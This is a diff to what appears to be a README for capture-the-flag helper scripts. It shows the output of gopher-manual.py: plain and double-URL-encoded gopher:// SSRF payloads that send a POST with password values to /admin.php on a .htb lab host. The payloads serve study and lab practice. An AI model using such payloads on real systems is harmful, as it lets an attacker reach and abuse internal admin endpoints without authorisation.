@@ -14,8 +14,8 @@ You may need to manually swap the request inside the `gopher-manual.py`
 ```shell
 ┌──(kali㉿kali)-[~]
 └─$ python3 gopher-manual.py
-gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
-gopher%3A//dateserver.htb%3A80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3A%2520dateserver.htb%250D%250AContent-Length%3A%252013%250D%250AContent-Type%3A%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin
+gopher://someserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2017%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Apassword%3Dadmin123
+gopher%3A//someserver.htb%3A80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3A%2520dateserver.htb%250D%250AContent-Length%3A%252017%250D%250AContent-Type%3A%2520application/x-www-form-urlencoded%250D%250A%250D%250Apassword%253Dadmin123
 ```
 
 ### 2. SSTI-payload-encode.py
